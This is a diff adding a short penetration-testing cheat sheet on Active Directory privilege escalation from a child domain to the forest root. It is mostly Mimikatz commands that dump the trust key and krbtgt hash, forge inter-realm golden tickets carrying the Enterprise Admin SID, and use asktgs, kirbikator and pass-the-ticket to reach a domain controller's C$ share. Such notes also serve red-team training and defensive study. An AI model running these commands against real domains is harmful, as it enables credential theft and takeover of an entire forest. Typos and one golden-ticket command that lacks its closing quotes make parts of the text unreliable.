@@ -1,0 +1,43 @@
+PRIVILEGE ESCALATION ACROSS TRUSTS
+Privilege Escalation Across Trusts
+
+1. Child to Forest Root
+
+2. Domains in same Forest have an implicit two-way trust with the Forest Root
+
+3. There is a trust key between the parent and child domains
+
+4. There are two ways of escalating privileges between two domains of the same forest 
+
+- KRBTGT hash
+
+- Trust Tickets
+
+Forging Trust Tickets Child to Forest Root
+
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+
+Once we have the Trust Key, let's forge and interrealm TGT
+
+Invoke-Mimikatz -Command '"Kerberos::golden /domain:victim.local /sid:<sid of current domain> /sids:<sid of high level user such as 519, enterprise admin> /rc4:<ntlm hash of trust key> /user:Administrator /service:krbtgt /target:<parent domain> /ticket:<path top .kirbi>"'
+
+Getting a TGS for a service such as CIFS by using the forged trust ticket
+
+.\asktgs.exe C:\Users\pathToTicket.kirbi CIFS/victim.local
+
+Tickets for other services like Host and RPCSS for WMI, HOST ans HTTP for Powershell Remoting and WinRM can also be created
+
+Once we have the TGS for a service, we can ise the TGS to access the targeted service with the following
+
+.\kirbikator.exe lsa .\CIFS.victim.local.kirbi ls \\dc01.victim.local\C$
+
+Forging a ticket from Child Domain to Forest Root using krbtgt hash
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<parent domain> /sid:<child domain SID /krbtgt:<hash of child domain krbtgt> /sids:<enterprise admin sid, or whatever sid you want to make up> /ticket:<location of .kirbi file>
+
+On a machine of the parent domain you wanna get into
+
+Invoke-Mimikatz -Command '"kerberos::ptt C:\location_of_.kirbi_file"'
+
